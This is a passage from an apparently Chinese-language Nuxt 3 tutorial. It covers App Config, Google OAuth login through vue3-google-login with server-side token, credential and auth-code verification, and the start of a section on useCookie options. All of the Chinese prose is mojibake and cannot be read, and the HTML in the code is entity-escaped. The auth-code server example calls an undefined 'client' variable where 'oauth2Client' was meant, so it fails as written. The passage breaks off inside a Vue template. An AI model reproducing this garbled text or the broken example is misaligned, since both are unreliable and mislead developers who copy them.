text-gray-600\u0026#34;\u0026gt;theme.darkMode:\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-3xl font-semibold text-blue-500\u0026#34;\u0026gt;{{ theme.darkMode }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const appConfig = useAppConfig() const { theme } = appConfig \u0026lt;/script\u0026gt; å»ºç«‹ ./pages/config.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/config.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-2xl text-gray-600\u0026#34;\u0026gt;theme.primaryColor:\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-3xl font-semibold text-blue-500\u0026#34;\u0026gt;{{ theme.primaryColor }}\u0026lt;/span\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-2xl text-gray-600\u0026#34;\u0026gt;theme.darkMode:\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-3xl font-semibold text-blue-500\u0026#34;\u0026gt;{{ theme.darkMode }}\u0026lt;/span\u0026gt; \u0026lt;button class=\u0026#34;mt-6 rounded-sm bg-blue-500 py-2 px-4 text-base font-medium text-white hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;theme.darkMode = !theme.darkMode\u0026#34; \u0026gt; {{ `${theme.darkMode ? \u0026#39;å–æ¶ˆ\u0026#39; : \u0026#39;å•Ÿç”¨\u0026#39;}æ·±è‰²æ¨¡å¼` }} \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;mt-8\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/\u0026#34;\u0026gt;å›é¦–é \u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const appConfig = useAppConfig() const { theme } = appConfig \u0026lt;/script\u0026gt; å¦‚ä¸‹åœ–ï¼Œæˆ‘å€‘çš„é¦–é å–å¾—äº† App Config ä¸­çš„ theme.darkMode é è¨­ç‚º falseï¼Œæ¥è‘—æˆ‘å€‘åˆ‡æ›è‡³ /config é é¢ï¼Œå¯ä»¥å°‡å¾ useAppConfig() è§£æ§‹å‡ºçš„ theme é€²è¡Œè®Šæ›´ï¼Œæˆ‘å€‘ä½¿ç”¨æŒ‰éˆ•ä¾†è¨­ç½® theme.darkMode ç‚º true æˆ– false è¡¨ç¤ºå•Ÿç”¨æˆ–å–æ¶ˆæ·±è‰²æ¨¡å¼ã€‚ç•¶è®Šæ›´å®Œæˆå¾Œï¼Œå›è‡³é¦–é ï¼Œå¯ä»¥ç™¼ç¾ theme.darkMode ç™¼ç”Ÿäº†éŸ¿æ‡‰ã€‚\nå°çµ Nuxt 3 æä¾›äº† Runtime Config åŠ App Config ä¾†è®“æˆ‘å€‘å°‡å¸¸ç”¨æˆ–é è¨­è¨­å®šæ‡‰ç”¨åœ¨ä¸åŒçš„æƒ…å¢ƒï¼Œä½¿ç”¨æ™‚ï¼Œæˆ‘å€‘åƒ…éœ€è¨˜å¾—ï¼Œä¸èƒ½å…¬é–‹çš„é‡‘é‘°æˆ–æ•æ„Ÿè¨Šæ¯ï¼Œåƒ…æ”¾ç½®åœ¨ runtimeConfig ä¸­è€Œä¸”ä¸åœ¨ public å±¬æ€§å…§ï¼ŒruntimeConfig.public é€šå¸¸æ”¾çš„æ˜¯å‰å¾Œç«¯æœƒä½¿ç”¨åˆ°ä¸”ä¸å¸¸ä¿®æ”¹çš„å¸¸æ•¸ã€‚è€Œ App Config å‰‡æ˜¯ç•¶ä¼ºæœå™¨ç«¯èˆ‡å®¢æˆ¶ç«¯éœ€è¦ä½¿ç”¨çš„è¨­ç½®ï¼Œå¦‚ä¸»é¡Œé¡è‰²ã€æ˜¯å¦å•Ÿç”¨æ·±è‰²æ¨¡å¼ç­‰é€™é¡å¯ä»¥è¢«ä½¿ç”¨è€…èª¿æ•´è®Šå‹•çš„ä¸”éœ€è¦å…·æœ‰éŸ¿æ‡‰æ€§ï¼Œå°±å¯ä»¥æ”¾ç½®åœ¨ appConfig ä¹‹ä¸­ã€‚\nå¯¦ä½œç·´ç¿’ é€™è£¡ä»‹ç´¹ç¶²ç«™çš„æœƒå“¡ç³»çµ±å¸¸æœƒä½¿ç”¨åˆ°ç¬¬ä¸‰æ–¹ç™»å…¥ï¼Œå°‡ä»¥ Google OAuth ç‚ºä¾‹ä¾†å¯¦éš›æ–¼ Nuxt 3 ä¸­åšä¸²æ¥ã€‚\nä¸²æ¥ Google OAuth ç™»å…¥ é¦–å…ˆï¼Œæˆ‘å€‘éœ€è¦æœ‰ä¸€çµ„ Google OAuth ä½¿ç”¨çš„ Client IDï¼Œä½ å¯ä»¥åˆ° Google Console æ–°å¢ä¸€å€‹ã€ŒOAuth 2.0 ç”¨æˆ¶ç«¯ IDã€ï¼Œé€™è£¡æˆ‘å°±ä¸å†è´…è¿°ç¶²é æ‡‰ç”¨ç¨‹å¼ç”¨çš„ç”³è«‹éç¨‹ã€‚\né€™é‚Šå°æé†’ä¸€ä¸‹ï¼Œåœ¨å»ºç«‹ OAuth Client ID æ™‚ï¼Œå·²æˆæ¬Šçš„ JavaScript ä¾†æºï¼Œè¨˜å¾—å¡«å¯«ä¸Šæ‚¨çš„æ­£å¼ç’°å¢ƒæˆ–é–‹ç™¼ç’°å¢ƒçš„ Domainï¼Œä¸”å»ºè­°ä½¿ç”¨ HTTPSã€‚\nå®Œæˆå¾Œï¼Œè¨˜å¾—ä¿ç®¡å¥½ç”¨æˆ¶ç«¯å¯†ç¢¼ã€ç”¨æˆ¶ç«¯ ID (Client ID) æ˜¯æˆ‘å€‘ç¨å¾Œæœƒéœ€è¦çš„ï¼Œç”¨æˆ¶ç«¯ç·¨è™Ÿæ ¼å¼å¤§æ¦‚å¦‚ï¼š\n1 168152363730-b37gnijdpa2rdvvbq0qc29cjh4082t3b.apps.googleusercontent.com æˆ‘å€‘å°‡é€™çµ„ Client IDï¼Œæ”¾ç½®åœ¨ Nuxt çš„ Runtime Config ä¹‹ä¸­ã€‚èª¿æ•´ nuxt.config.ts å…§å®¹ï¼Œåœ¨ runtimeConfig.public æ·»åŠ  googleClientIdã€‚\nnuxt.config.ts 1 2 3 4 5 6 7 export default defineNuxtConfig({ runtimeConfig: { public: { googleClientId: \u0026#39;é€™é‚Šæ”¾ä¸Šä½ çš„ Google Client ID\u0026#39; } } }) æ¥ä¸‹ä¾†ï¼Œå®‰è£ Vue çš„ Google OAuth æ’ä»¶ï¼Œé€™é‚Šä½¿ç”¨çš„æ˜¯ vue3-google-loginï¼Œä¹Ÿæœ‰è©³ç´°çš„èªªæ˜æ–‡ä»¶å¯ä»¥åƒè€ƒã€‚\nå®‰è£ vue3-google-login\n1 2 3 npm install -D vue3-google-login # or # yarn add -D vue3-google-login å»ºç«‹ Nuxt 3 æ’ä»¶ä¾†ä½¿ç”¨ vue3-google-loginï¼Œæ–°å¢ ./plugins/vue3-google-login.client.jsï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nplugins/vue3-google-login.client.js 1 2 3 4 5 6 7 8 9 10 import vue3GoogleLogin from \u0026#39;vue3-google-login\u0026#39; export default defineNuxtPlugin((nuxtApp) =\u0026gt; { const runtimeConfig = useRuntimeConfig() const { googleClientId: GOOGLE_CLIENT_ID } = runtimeConfig.public nuxtApp.vueApp.use(vue3GoogleLogin, { clientId: GOOGLE_CLIENT_ID }) }) æ¥è‘—æˆ‘å€‘åœ¨å…ƒä»¶ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨ \u0026lt;GoogleLogin\u0026gt; å…ƒä»¶ï¼Œä¸¦æ·»åŠ ä¸€å€‹ callback å±¬æ€§ï¼›æ­¤å¤–ï¼Œæˆ‘ä½¿ç”¨äº† Nuxt 3 æä¾›çš„ \u0026lt;ClientOnly\u0026gt; å…ƒä»¶ï¼Œå°‡ \u0026lt;GoogleLogin\u0026gt; åŒ…è£¹èµ·ä¾†ï¼Œä»¥ç¢ºä¿è©²å…ƒä»¶åƒ…åœ¨å®¢æˆ¶ç«¯åšæ¸²æŸ“ï¼Œä»¥å…ç™»å…¥æŒ‰éˆ•åœ¨åˆå§‹åŒ–ç™¼ç”Ÿå•é¡Œã€‚\npages/login.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ClientOnly\u0026gt; \u0026lt;GoogleLogin :callback=\u0026#34;callback\u0026#34; /\u0026gt; \u0026lt;/ClientOnly\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const callback = (response) =\u0026gt; { console.log(response) } \u0026lt;/script\u0026gt; æ¥è‘—æˆ‘å€‘å•Ÿå‹• Nuxt ä¼ºæœå™¨ï¼Œé€™é‚Šæˆ‘æœƒç¿’æ…£ä½¿ç”¨ yarn run dev -- --https ä¾†å•Ÿç”¨ HTTPS åšæ¸¬è©¦ï¼Œå°±èƒ½ç™¼ç¾ä½¿ç”¨ Google å¸³è™Ÿç™»å…¥æˆåŠŸå¾Œï¼Œæ‰€è¿”å›çš„ Credentialã€‚\nOne Tap prompt ä½ å¯ä»¥åœ¨ \u0026lt;GoogleLogin\u0026gt; å…ƒä»¶æ·»åŠ  prompt å±¬æ€§ä¸¦è¨­ç‚º trueï¼Œé€™æ¨£å°±èƒ½åŒæ™‚å•Ÿç”¨ Google ä¸€éµç™»å…¥ (One Tap prompt) çš„åŠŸèƒ½å›‰ï¼\n1 \u0026lt;GoogleLogin :callback=\u0026#34;callback\u0026#34; prompt /\u0026gt; æˆ–è€…ä¹Ÿå¯ä»¥åœ¨ onMounted ä¸­å‘¼å« vue3-google-login çš„ googleOneTap() æ–¹æ³•ï¼Œä¾†å–®ç¨ä½¿ç”¨ One Tap promptã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script setup\u0026gt; import { googleOneTap } from \u0026#39;vue3-google-login\u0026#39; onMounted(() =\u0026gt; { googleOneTap() .then((response) =\u0026gt; { console.log(response) }) .catch((error) =\u0026gt; { console.error(error) }) }) \u0026lt;/script\u0026gt; è‡ªè¨‚æŒ‰éˆ• å¦‚æœä½ æƒ³è‡ªè¨‚ç™»å…¥æŒ‰éˆ•çš„æ¨£å¼ï¼Œå¯ä»¥åœ¨ \u0026lt;GoogleLogin\u0026gt; çš„é è¨­æ’æ§½ (Slot) åšå»ºç«‹ã€‚\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;GoogleLogin :callback=\u0026#34;callback\u0026#34;\u0026gt; \u0026lt;button\u0026gt;ä½¿ç”¨ Google é€²è¡Œç™»å…¥\u0026lt;/button\u0026gt; \u0026lt;/GoogleLogin\u0026gt; \u0026lt;/template\u0026gt; ä½¿ç”¨è‡ªè¨‚æŒ‰éˆ•æœƒè®“ OAuth æµç¨‹ç¨å¾®æœ‰é»ä¸ä¸€æ¨£ï¼Œç•¶ä½ ç™»å…¥æˆåŠŸå¾Œé è¨­æœƒå›å‚³ Auth Codeã€‚\nå¦‚æœè¨­å®šå±¬æ€§ popup-type=\u0026quot;TOKEN\u0026quot;ï¼Œå‰‡å›å‚³ Access Tokenã€‚\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;GoogleLogin :callback=\u0026#34;callback\u0026#34; popup-type=\u0026#34;TOKEN\u0026#34;\u0026gt; \u0026lt;button\u0026gt;ä½¿ç”¨ Google é€²è¡Œç™»å…¥\u0026lt;/button\u0026gt; \u0026lt;/GoogleLogin\u0026gt; \u0026lt;/template\u0026gt; ä½¿ç”¨ googleTokenLogin() åœ¨å…ƒä»¶ä¸­æˆ‘å€‘ä¹Ÿå¯ä»¥è‡ªå·±å»ºç«‹ handleGoogleLogin é»æ“Šäº‹ä»¶ï¼Œå‘¼å« googleTokenLogin() æ–¹æ³•ä¸¦å‚³å…¥è¨­å®šåœ¨ Runtime Config ä¸­çš„ Google Client IDï¼Œé€™æ¨£é»æ“Šç™»å…¥æŒ‰éˆ•å°±èƒ½è™•ç† Google ç™»å…¥å–å¾— Access Tokenã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script setup\u0026gt; import { googleTokenLogin } from \u0026#39;vue3-google-login\u0026#39; const runtimeConfig = useRuntimeConfig() const { googleClientId: GOOGLE_CLIENT_ID } = runtimeConfig.public const handleGoogleLogin = () =\u0026gt; { googleTokenLogin({ clientId: GOOGLE_CLIENT_ID }).then((response) =\u0026gt; { console.log(response) }) } \u0026lt;/script\u0026gt; å»ºç«‹ä¸€å€‹ç™»å…¥æŒ‰éˆ•ä¾†å‘¼å« handleGoogleLogin é»æ“Šäº‹ä»¶ã€‚\n1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; @click=\u0026#34;handleGoogleLogin\u0026#34; \u0026gt; ä½¿ç”¨ Google ç¹¼çºŒ \u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; ä½¿ç”¨ vue3-google-login æä¾›çš„ googleTokenLogin() æ–¹æ³•ï¼Œæˆ‘å€‘å°±èƒ½å–å¾— Google ä½¿ç”¨è€…çš„ Access Token å›‰ï¼\nä½¿ç”¨ googleAuthCodeLogin() æˆ‘å€‘ä¹Ÿå¯ä»¥ä½¿ç”¨ googleAuthCodeLogin() ä¾†å–å¾— Auth Codeã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script setup\u0026gt; import { googleAuthCodeLogin } from \u0026#39;vue3-google-login\u0026#39; const runtimeConfig = useRuntimeConfig() const { googleClientId: GOOGLE_CLIENT_ID } = runtimeConfig.public const handleGoogleLogin = () =\u0026gt; { googleAuthCodeLogin({ clientId: GOOGLE_CLIENT_ID }).then((response) =\u0026gt; { console.log(response) }) } \u0026lt;/script\u0026gt; ä¼ºæœå™¨ç«¯é©—è­‰ ç•¶ä½¿ç”¨è€…æ–¼å‰ç«¯æˆåŠŸç™»å…¥å¾Œï¼Œé€šå¸¸æœƒå‚³è‡³å¾Œç«¯é€²è¡Œç™»å…¥æˆ–è¨˜éŒ„ä½¿ç”¨è€…ï¼Œå†ç”¢ç”Ÿä½¿ç”¨æ–¼ç¶²ç«™çš„ Tokenã€Cookie æˆ– Session ç­‰ï¼Œä»¥ä¾›å¾ŒçºŒçš„ç¶²ç«™é©—è­‰åšä½¿ç”¨ã€‚\næˆ‘å€‘å¯ä½¿ç”¨ google-auth-library æ–¼å¾Œç«¯é€²è¡Œä¸€ç³»åˆ—çš„é©—è­‰æˆ–å–å¾—ä½¿ç”¨è€…è³‡è¨Šã€‚\nå®‰è£ google-auth-library\n1 2 3 npm install -D google-auth-library # or # yarn add -D google-auth-library æ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘å°±èƒ½ä¾ç…§ä¸åŒçš„ç™»å…¥æ–¹å¼å–å¾—çš„ Credentialã€Access Token æˆ– Auth Code é€è‡³å¾Œç«¯åšé©—è­‰ã€‚\né©—è­‰ Access Token æ–°å¢ä¸€å€‹ Server APIï¼Œåªæ¥å— POST æ–¹æ³•ï¼Œåœ¨ Body ä¸­å¤¾å¸¶ accessToken ç™¼é€è‡³å¾Œç«¯ã€‚\nå»ºç«‹ ./server/api/auth/google.post.jsï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nserver/api/auth/google.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import { OAuth2Client } from \u0026#39;google-auth-library\u0026#39; export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) const oauth2Client = new OAuth2Client() oauth2Client.setCredentials({ access_token: body.accessToken }) const userInfo = await oauth2Client .request({ url: \u0026#39;https://www.googleapis.com/oauth2/v3/userinfo\u0026#39; }) .then((response) =\u0026gt; response.data) .catch(() =\u0026gt; null) oauth2Client.revokeCredentials() if (!userInfo) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Invalid token\u0026#39; }) } return { id: userInfo.sub, name: userInfo.name, avatar: userInfo.picture, email: userInfo.email, emailVerified: userInfo.email_verified, } }) èª¿æ•´å…ƒä»¶å…§çš„ç™»å…¥æµç¨‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;script setup\u0026gt; import { googleTokenLogin } from \u0026#39;vue3-google-login\u0026#39; const runtimeConfig = useRuntimeConfig() const { googleClientId: GOOGLE_CLIENT_ID } = runtimeConfig.public const userInfo = ref() const handleGoogleLogin = async () =\u0026gt; { const accessToken = await googleTokenLogin({ clientId: GOOGLE_CLIENT_ID }).then((response) =\u0026gt; response?.access_token) if (!accessToken) { return \u0026#39;ç™»å…¥å¤±æ•—\u0026#39; } const { data } = await useFetch(\u0026#39;/api/auth/google\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: { accessToken }, initialCache: false }) userInfo.value = data.value } \u0026lt;/script\u0026gt; ç•¶æˆ‘å€‘ä½¿ç”¨ Google OAuth ç™»å…¥æˆåŠŸå¾Œï¼Œæœƒå–å¾— Access Tokenï¼Œä¸¦å°‡å…¶å‚³è‡³ Server APIï¼Œ/api/auth/google æ¥æ”¶ Access Token ä¸¦ä½¿ç”¨ Google API å–å¾—ä½¿ç”¨è€…çš„è³‡è¨Šï¼Œæœ€å¾Œå›å‚³çµ¦å‰ç«¯ã€‚\né©—è­‰ Credential åœ¨å…ƒä»¶ä¸­ï¼Œæˆ‘å€‘ä½¿ç”¨çš„ç™»å…¥æ–¹å¼å¦‚æœæ˜¯ Google æ¸²æŸ“çš„é è¨­æŒ‰éˆ•æˆ– One Tap promptï¼Œå›å‚³å€¼å°±æœƒåŒ…å« Credentialï¼Œæˆ‘å€‘å°‡å°±å¯ä½¿ç”¨ä¸‹é¢ä¿®æ”¹å¾Œçš„ Server API é€²è¡Œé©—è­‰ã€‚\nserver/api/auth/google.post.js å…§å®¹ä¿®æ”¹ç‚ºå¦‚ä¸‹ï¼š\nserver/api/auth/google.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import { OAuth2Client } from \u0026#39;google-auth-library\u0026#39; export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) const oauth2Client = new OAuth2Client() const ticket = await oauth2Client.verifyIdToken({ idToken: body.credential, }) const payload = ticket.getPayload() if (!payload) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Invalid token\u0026#39; }) } return { id: payload.sub, name: payload.name, avatar: payload.picture, email: payload.email, emailVerified: payload.email_verified } }) é©—è­‰ Auth Code æˆ‘å€‘ä½¿ç”¨çš„ç™»å…¥æ–¹å¼å¦‚æœæ˜¯å‘¼å« vue3-google-login çš„ googleAuthCodeLogin()ï¼Œå›å‚³å€¼å°±æœƒåŒ…å« Auth Codeï¼Œæˆ‘å€‘å°±å¯ä½¿ç”¨ä¸‹é¢ä¿®æ”¹å¾Œçš„ Server API é€²è¡Œé©—è­‰ã€‚\nserver/api/auth/google.post.js å…§å®¹ä¿®æ”¹ç‚ºå¦‚ä¸‹ï¼š\nserver/api/auth/google.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import { OAuth2Client } from \u0026#39;google-auth-library\u0026#39; export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) const oauth2Client = new OAuth2Client({ clientId: \u0026#39;ä½ çš„ Google Client ID\u0026#39;, clientSecret: \u0026#39;ä½ çš„ Google Client Secret\u0026#39;, redirectUri: \u0026#39;ä½ çš„ Google Redirect Uri\u0026#39; }) let { tokens } = await oauth2Client.getToken(body.authCode) client.setCredentials({ access_token: tokens.access_token }) const userInfo = await oauth2Client .request({ url: \u0026#39;https://www.googleapis.com/oauth2/v3/userinfo\u0026#39; }) .then((response) =\u0026gt; response.data) .catch(() =\u0026gt; null) oauth2Client.revokeCredentials() if (!userInfo) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Invalid token\u0026#39; }) } return { id: userInfo.sub, name: userInfo.name, avatar: userInfo.picture, email: userInfo.email, emailVerified: userInfo.email_verified, } }) ä»¥ä¸Šå¯¦ç¾äº†ä¸²æ¥ Google OAuth ç™»å…¥ï¼Œä¸¦å°‡ Access Token è³‡è¨Šç™¼é€è‡³å¾Œç«¯é€²è¡Œé©—è­‰ï¼Œå¤§å®¶å¯ä»¥åœ¨ä¾ç…§ä½¿ç”¨æƒ…å¢ƒè‡ªå·±æŒ‘é¸ç™»å…¥æ–¹å¼åŠé©—è­‰æ–¹å¼ï¼Œå¾ŒçºŒä¹Ÿèƒ½å°‡ä½¿ç”¨è€…è³‡è¨Šå„²å­˜åˆ°è³‡æ–™åº«ä¸­ï¼Œæœ‰äº†è³‡æ–™åº«æˆ‘å€‘å°±èƒ½ä¾ç…§ä½¿ç”¨è€…è³‡è¨Šï¼Œä¾†æ¯”å°è³‡æ–™åº«é€²è¡Œè¨»å†Šã€é©—è­‰ç™»å…¥åŠç”¢ç”Ÿå¾ŒçºŒçš„ Session æˆ– Cookie ç­‰ã€‚\nCookie çš„è¨­ç½®èˆ‡ JWT çš„æ­é… Cookie åœ¨ç€è¦½ç¶²ç«™æ™‚å¤šæœƒä½¿ç”¨åˆ°ï¼Œä¸è«–æ˜¯ç”¨ä¾†å„²å­˜è‡¨æ™‚çš„è³‡è¨Šæˆ–æ˜¯è¾¨è­˜ä½¿ç”¨è€…ç­‰ï¼Œé€™ä¸€å€‹å„²å­˜åœ¨ç€è¦½å™¨çš„ä¸€å°æ®µæ–‡å­—è³‡æ–™ï¼Œæœƒåœ¨æ¯æ¬¡ç™¼é€ HTTP è«‹æ±‚æ™‚è‡ªå‹•å¤¾å¸¶ï¼Œæ‰€ä»¥ Cookie æœ€å¸¸è¦‹çš„ç”¨é€”å°±åŒ…å«äº†ç™»å…¥ç‹€æ…‹ã€é©—è­‰èº«ä»½ç­‰ã€‚\nä»¥ä¸‹å°‡è¬›è¿°åœ¨ Nuxt 3 å¦‚ä½•è¨­ç½® Cookieï¼Œä¸¦çµåˆ JWT (JSON Web Token) ä¾†åšä¸€å€‹å¯¦éš›ä½¿ç”¨è€…é©—è­‰ã€‚\nNuxt 3 Cookie çš„è¨­ç½®æ–¹å¼ useCookie Nuxt 3 æä¾›äº†ä¸€å€‹çµ„åˆå¼å‡½æ•¸ useCookie() ä¾†è®“æˆ‘å€‘å¯ä»¥è®€å¯« Cookieï¼Œä¸¦ä¸”å°æ–¼ SSR ä¹Ÿæœ‰æ”¯æ´ï¼Œåœ¨é é¢ã€å…ƒä»¶æˆ–æ’ä»¶ä¸­ï¼Œéƒ½å¯ä»¥ä½¿ç”¨ useCookie() ä¾†å»ºç«‹ä¸€å€‹ cookie å…·æœ‰éŸ¿æ‡‰æ€§çš„åƒè€ƒã€‚\nä½¿ç”¨æ–¹å¼ï¼š\n1 const cookie = useCookie(name, options) nameï¼šå°æ‡‰çš„å°±æ˜¯ cookie çš„ keyã€‚ optionsï¼šå‚³å…¥ä¸€å€‹ç‰©ä»¶ä¾†è¨­ç½®å¤šå€‹ cookie å±¬æ€§ï¼š maxAgeï¼šæŒ‡å®š Max-Age å±¬æ€§çš„å€¼ï¼Œå–®ä½æ˜¯ç§’ã€‚å¦‚æœæ²’æœ‰è¨­ç½®ï¼Œå‰‡é€™å€‹ cookie å°‡æœƒæ˜¯ Session Onlyï¼Œæ„å³ç¶²é é—œé–‰å¾Œå°±æœƒæ¶ˆå¤±ã€‚ expiresï¼šæŒ‡å®šä¸€å€‹ Date ç‰©ä»¶ä¾†ä½œç‚ºéæœŸçš„æ™‚é–“ï¼Œé€šå¸¸æ˜¯è¦ç›¸å®¹æ¯”è¼ƒèˆŠçš„ç€è¦½å™¨åšä½¿ç”¨ï¼Œå¦‚æœ maxAge èˆ‡ expires å±¬æ€§éƒ½æœ‰è¨­å®šï¼Œå‰‡éæœŸæ™‚é–“æ‡‰è©²è¦è¨­å®šç‚ºä¸€æ¨£ã€‚ httpOnlyï¼šæ˜¯ä¸€å€‹å¸ƒæ—å€¼ï¼Œé è¨­ç‚º falseï¼Œç•¶è¨­ç½®ç‚º true æ™‚ï¼Œè¡¨ç¤ºå®¢æˆ¶ç«¯çš„ JavaScript å°‡ç„¡æ³•ä½¿ç”¨ document.cookie ä¾†æŸ¥çœ‹é€™å€‹ cookieã€‚é€šå¸¸æ˜¯æ¯”è¼ƒæ•æ„Ÿæˆ–æ©Ÿå¯†çš„è¨Šæ¯ï¼Œå¦‚ Token æˆ– Session Id æœƒè¨­å®šç‚º trueï¼Œåªè®“ç€è¦½å™¨ç™¼å‡ºè«‹æ±‚æ™‚è‡ªå‹•å¤¾å¸¶ã€‚ secureï¼šæ˜¯ä¸€å€‹å¸ƒæ—å€¼ï¼Œé è¨­ç‚º falseï¼Œç•¶è¨­ç½®ç‚º true æ™‚ç€è¦½å™¨å¾—æ˜¯ HTTPS çš„åŠ å¯†å‚³è¼¸å”å®šçš„æƒ…å¢ƒä¸‹ï¼Œæ‰æœƒè‡ªå‹•å¤¾å¸¶é€™å€‹ cookieã€‚ domainï¼šæŒ‡å®š cookie å¯ä»¥é©ç”¨çš„ Domainï¼Œé€šå¸¸æœƒä¿æŒé è¨­ï¼Œè¡¨ç¤ºé©ç”¨æ–¼è‡ªå·±çš„ Domain ä¹‹ä¸‹ã€‚ pathï¼šæŒ‡å®š cookie é©ç”¨çš„è·¯å¾‘ã€‚ sameSiteï¼šç‚ºä¸€å€‹å¸ƒæ—å€¼æˆ–æ˜¯å­—ä¸²ï¼Œç”¨æ–¼è¨­å®šå®‰å…¨ç­–ç•¥ã€‚ encodeï¼šç”±æ–¼ cookie çš„å€¼åªèƒ½ä½¿ç”¨æœ‰é™çš„å­—å…ƒé›†ï¼Œæ‰€ä»¥é€™å€‹è¨­ç½®å¯ä»¥å°‡ cookie ç·¨ç¢¼æˆåˆæ³•çš„å­—ä¸²å€¼ï¼Œé è¨­çš„ç·¨ç¢¼æ˜¯ä½¿ç”¨ JSON.stringify + encodeURIComponent()ã€‚ decodeï¼šcookie æœƒç¶“éä¸€å€‹è§£ç¢¼çš„éç¨‹ï¼Œé è¨­çš„è§£ç¢¼æ˜¯ä½¿ç”¨ decodeURIComponent + destrã€‚ defaultï¼šç‚ºä¸€å€‹å‡½æ•¸ï¼Œå¯ä»¥ç”¨æ–¼å›å‚³ cookie çš„é è¨­å€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯å›å‚³ä¸€å€‹ Refã€‚ èˆ‰å€‹ä¾‹å­ï¼Œæ–°å¢ pages/cookie.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/cookie.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center justify-center py-12 px-4 sm:px-6 lg:px-8\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;w-full max-w-md\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;mt-2 text-center text-3xl font-bold tracking-tight text-gray-700\u0026#34;\u0026gt;Cookie\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-2 flex w-full max-w-md flex-col items-center\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;mt-2 w-fit rounded-sm bg-emerald-500 py-2 px-4 text-sm text-white hover:bg-emerald-600 focus:outline-none focus:ring-2 focus:ring-emerald-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;setNameCookie\u0026#34; \u0026gt; è¨­ç½® name \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;mt-2 flex\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;text-lg font-semibold text-emerald-500\u0026#34;\u0026gt;name:\u0026lt;/label\u0026gt; \u0026lt;span class=\u0026#34;ml-2 flex text-lg text-slate-700\u0026#34;\u0026gt;{{ name }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-2 flex w-full max-w-md flex-col items-center\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;mt-2 w-fit rounded-sm bg-emerald-500 py-2 px-4 text-sm text-white hover:bg-emerald-600 focus:outline-none focus:ring-2 focus:ring-emerald-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;setCounterCookie\u0026#34; \u0026gt; è¨­ç½® counter \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;mt-2 flex\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;text-lg font-semibold text-emerald-500\u0026#34;\u0026gt;counter:\u0026lt;/label\u0026gt; \u0026lt;span class=\u0026#34;ml-2 flex text-lg text-slate-700\u0026#34;\u0026gt;{{ counter }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 